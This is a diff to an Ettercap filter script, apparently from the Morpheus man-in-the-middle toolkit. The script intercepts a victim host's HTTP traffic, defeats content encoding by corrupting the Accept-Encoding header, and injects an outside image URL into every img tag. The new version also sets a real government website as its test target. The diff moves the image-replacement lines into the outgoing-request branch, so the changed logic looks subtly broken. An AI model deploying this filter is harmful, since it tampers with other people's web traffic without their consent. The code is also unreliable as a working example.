@@ -15,52 +15,31 @@
 #  This filter will substitute the html tag '<img src=>'
 #  and injects your image in any webpage requested by TaRONE
 #  Warning: This filter only modifies http traffic..
-#  access this url to test: https://nhm.org/site/
+#  access this url to test: http://antt.dglab.gov.pt/
 ##
 
 
 
-
-##########################
-## Zap Content Encoding ##
-##########################
-# change target request to server
-if (ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:TaRONE   [ -> ]  port:80   [tcp] http ☆");
-    if (search(DATA.data, "Accept-Encoding")) {  
-      replace("Accept-Encoding", "Accept-Rubbishe"); # note: replacement string is same length as original string
-      msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
-      msg("[Morpheus] |_ info : Accept-Encoding zapped from request ✔\n");
-    }
+if (ip.proto == TCP && tcp.dst == 80 || tcp.src == 80) {
+    msg("[morpheus] host:ALL     [ ⊶  ]  port:80   [tcp] http ☆");
 }
-
-if (ip.proto == TCP && tcp.dst == 80) {
-  if (search(DATA.data, "gzip")) {  
-    replace("gzip", "  "); # note: four spaces In the replacement string
-   }  
+if (ip.proto == TCP && tcp.dst == 443 || tcp.src == 443) {
+    msg("[morpheus] host:ALL     [ ⊶  ]  port:443  [tcp] https ☆");
 }
-
-if (ip.proto == TCP && tcp.dst == 80) {
-  if (search(DATA.data, "deflate")) {
-    replace("deflate", "       "); # note: seven spaces In the replacement string
-  }
-}
-
-
-
 
 
 
 #####################
 ## Replace Content ##
 #####################
-# change server response to target
-if (ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:TaRONE   [ <- ]  port:80   [tcp] http ☆");
-  replace("img src=", "img src=\"http://www.cranklin.com/mickey.png\" ");
-  replace("IMG SRC=", "img src=\"http://www.cranklin.com/mickey.png\" ");
-  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
-  msg("[Morpheus] | status: (img) string found in tcp packet ✔");
-  msg("[Morpheus] |_ info : string replaced and forward to target ✔\n");   
-} 
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+        msg("\n[morpheus] host:TaRONE   [ ⊶ ]  port:80   [tcp] http ☆");
+          replace("img src=", "img src=\"http://www.cranklin.com/mickey.png\" ");
+          replace("IMG SRC=", "img src=\"http://www.cranklin.com/mickey.png\" ");
+        msg("[Morpheus] | status: (img) string found in tcp packet ✔");
+        msg("[Morpheus] |_ info : string replaced and forward to target ✔\n");
+   }
+}
 
